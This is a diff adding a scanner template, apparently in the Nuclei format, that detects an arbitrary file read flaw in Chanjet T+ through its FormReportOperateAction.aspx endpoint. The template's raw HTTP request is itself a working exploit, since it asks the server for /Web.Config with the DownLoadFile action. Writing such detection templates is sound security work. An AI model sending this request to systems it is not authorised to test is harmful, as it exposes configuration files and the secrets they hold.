@@ -1,0 +1,24 @@
+id: changjietongT-FormReportOperateAction-fileread
+
+info:
+  name: 畅捷通T+ FormReportOperateAction 存在任意文件读取漏洞
+  author: changjietongT
+  severity: high
+  tags: changjietong,T+,fileread
+
+http:
+  - raw:
+      - |
+        GET /tplus/FormReport/FormReportOperateAction.aspx?preload=1&__Action=DownLoadFile&filepath=/Web.Config HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'config'
+      - type: status
+        status: 
+          - 200
